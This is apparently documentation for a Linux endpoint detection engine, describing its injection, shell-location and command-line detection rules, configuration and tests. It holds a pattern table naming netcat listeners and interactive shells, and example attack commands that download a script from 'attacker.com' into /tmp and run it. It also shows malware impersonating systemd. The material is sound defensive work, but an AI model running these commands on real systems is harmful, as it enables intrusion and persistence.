# Linux Detection Capabilities

## Overview

The Behavioral Detection Engine includes comprehensive Linux-specific threat detection capabilities, designed to identify common attack patterns and malicious activities unique to Linux environments.

## Linux-Specific Detection Features

### 🔍 Process Injection Detection

#### ptrace Injection Monitoring
The detector identifies Linux process injection patterns:
```
ptrace(PTRACE_ATTACH) → mmap() → mprotect(PROT_EXEC)
```

**Detection Logic:**
- Monitors for ptrace system calls with suspicious parameters
- Tracks memory mapping operations with executable permissions
- Detects memory protection changes that allow code execution
- Risk Score: **1.8x multiplier** for complete sequence

#### Shared Library Injection
Detects malicious shared library loading:
- `dlopen()` calls loading from suspicious paths
- `dlsym()` calls looking up suspicious functions
- `LD_PRELOAD` environment variable abuse

### 🐚 Shell Execution Analysis

#### Suspicious Shell Locations
Monitors shell execution from dangerous directories:
- `/tmp/` - Temporary files directory
- `/dev/shm/` - Shared memory filesystem
- `/var/tmp/` - Variable temporary files
- `/.cache/` - User cache directories
- `/home/*/Downloads/` - Downloads directory

#### Browser-Spawned Shells
Detects shells launched by web browsers:
- Firefox, Chrome, Chromium, Safari, Edge, Opera
- **Risk Score: 0.9** (High severity)
- Common in web-based exploits and malicious downloads

#### Unusual Parent Processes
Identifies shells spawned by unexpected applications:
- Discord, Slack, Teams, Steam
- **Risk Score: 0.7** (Medium-High severity)

### 🛡️ System Process Validation

#### systemd Process Context
Validates systemd processes are in expected locations:

**Expected Paths:**
- `/lib/systemd/`
- `/usr/lib/systemd/`
- `/bin/`
- `/sbin/`

**Detection Rules:**
- **Baseline Risk Reduction:** 80% when in expected location
- **Elevated Risk Multiplier:** 3.0x when in unexpected location
- **Max Instances:** 50 (systemd can have many child processes)

#### init Process Context
Monitors init process legitimacy:

**Expected Paths:**
- `/sbin/`
- `/bin/`
- `/usr/sbin/`

**Detection Rules:**
- **Baseline Risk Reduction:** 90% when in expected location
- **Elevated Risk Multiplier:** 5.0x when in unexpected location
- **Max Instances:** 1 (only one true init process)

### 📜 Command Line Pattern Analysis

#### Linux-Specific Suspicious Patterns

| Pattern | Risk Score | Description |
|---------|------------|-------------|
| `base64` | 0.5 | Base64 encoding/decoding (obfuscation) |
| `ptrace` | 0.7 | Process tracing system call |
| `LD_PRELOAD` | 0.8 | Shared library preloading |
| `dd if=` | 0.5 | Data dumping operations |
| `nc -l` | 0.6 | Netcat listener (backdoor) |
| `python -c` | 0.5 | Python one-liner execution |
| `perl -e` | 0.5 | Perl one-liner execution |
| `bash -i` | 0.6 | Interactive bash shell |
| `chmod +x` | 0.7 | Making files executable |
| `/dev/shm` | 0.8 | Shared memory references |
| `/tmp/` | 0.6 | Temporary directory references |

### 🗂️ File System Monitoring

#### Linux Executable Detection
Monitors for executable files with Linux-specific extensions:
- `.so` - Shared libraries
- `.bin` - Binary executables
- `.out` - Compiled output files
- `.elf` - ELF format executables
- **Extensionless files** starting with `/` (common on Linux)

#### Browser Cache Execution
Detects processes executing from browser cache directories:
- `/.cache/`
- `/.mozilla/firefox/`
- `/.config/google-chrome/`
- `/.config/chromium/`
- `/snap/firefox/common/.cache/`
- `/tmp/mozilla_*`
- `/tmp/chrome_*`

**Risk Score: 0.8** (High severity)

## Testing Linux Detection

### Running the Linux Detection Test
```bash
cargo run --bin test_linux_detection
```

### Test Coverage
The test validates:

1. **System Process Context** (2 tests)
   - systemd in expected location (no alert)
   - systemd in suspicious location (alert generated)

2. **Shell Execution Monitoring** (3 tests)
   - Shell in `/tmp/` (alert)
   - Shell in `/dev/shm/` (alert)
   - Browser cache execution (alert)

3. **Process Injection Simulation** (2 tests)
   - ptrace injection sequence (alert)
   - .so library injection (alert)

4. **Command Line Analysis** (2 tests)
   - Suspicious curl command (alert)
   - Base64 + ptrace patterns (alert)

5. **Baseline Validation** (1 test)
   - Normal process in `/bin/` (no alert)

### Expected Results
```
📊 Total alerts generated: 8

Alert Types:
• Suspicious process path (3)
• Shell execution from suspicious location (2)
• Process execution from browser cache (1)
• Suspicious command line pattern (2)
```

## Configuration

### Linux-Specific Settings
```yaml
detectors:
  behavioral:
    enabled: true
    cross_platform_detection: true  # Enables Linux-specific rules
    alert_threshold: 0.4
    
    # System process contexts (automatically configured)
    system_process_contexts:
      systemd:
        expected_paths:
          - "/lib/systemd/"
          - "/usr/lib/systemd/"
          - "/bin/"
          - "/sbin/"
        max_instances: 50
        baseline_risk_reduction: 0.8
        elevated_risk_multiplier: 3.0
        
      init:
        expected_paths:
          - "/sbin/"
          - "/bin/"
          - "/usr/sbin/"
        max_instances: 1
        baseline_risk_reduction: 0.9
        elevated_risk_multiplier: 5.0
```

## Performance Considerations

### Resource Usage
- **Memory Impact:** Minimal - processes tracked in HashMap
- **CPU Impact:** Low - pattern matching on events only
- **Storage:** Events compressed with 90%+ efficiency

### Tuning for Linux Environments

#### Development Environment
```yaml
detectors:
  behavioral:
    alert_threshold: 0.5  # Reduce noise from build tools
    scan_interval_ms: 5000
```

#### Server Environment
```yaml
detectors:
  behavioral:
    alert_threshold: 0.3  # More sensitive
    monitor_memory_operations: true
    track_api_calls: true
```

#### Container Environment
```yaml
detectors:
  behavioral:
    alert_threshold: 0.4
    # Consider container-specific expected paths
```

## Common Attack Patterns Detected

### 1. Web Shell Deployment
```bash
# Detected pattern
curl http://attacker.com/shell.php > /tmp/shell.php
chmod +x /tmp/shell.php
/tmp/shell.php
```
**Alerts Generated:** Suspicious command line (curl), executable in suspicious location

### 2. Process Injection Attack
```bash
# Detected sequence
./injector /tmp/payload.so target_pid
# Uses: ptrace() → mmap() → mprotect()
```
**Alerts Generated:** ptrace usage, suspicious process path

### 3. Persistence via System Process Impersonation
```bash
# Malicious systemd impersonation
cp malware /tmp/systemd
/tmp/systemd --system
```
**Alerts Generated:** systemd in unexpected location (5.0x risk multiplier)

### 4. Browser Exploit Payload
```bash
# Browser downloads and executes payload
# Detected in browser cache execution
```
**Alerts Generated:** Process execution from browser cache

## Integration with Security Tools

### SIEM Integration
```bash
# Export Linux-specific alerts
grep "ptrace\|systemd\|/tmp/\|/dev/shm" logs/edr-agent.log | jq '.'
```

### Threat Hunting Queries
```bash
# Find suspicious systemd processes
jq '.events[] | select(.event_type == "SecurityAlert" and .description | contains("systemd"))' data/events_*.json.gz

# Identify shell injection attempts
jq '.events[] | select(.event_type == "SecurityAlert" and .description | contains("shell"))' data/events_*.json.gz
```

## Best Practices for Linux Detection

1. **Monitor system process contexts** - Validate systemd/init locations
2. **Watch temporary directories** - High-risk execution locations
3. **Analyze shell ancestry** - Unusual parent processes indicate compromise
4. **Track library loading** - Monitor .so injection attempts
5. **Command line analysis** - Look for obfuscation and evasion techniques

## Limitations and Future Enhancements

### Current Limitations
- **No real-time API hooking** - Relies on event simulation for testing
- **Limited container awareness** - May need tuning for containerized environments
- **Static pattern matching** - No machine learning adaptation yet

### Planned Enhancements
- **eBPF integration** for real-time system call monitoring
- **Container-aware detection** with namespace understanding
- **Machine learning** for adaptive pattern recognition
- **Network correlation** with process events
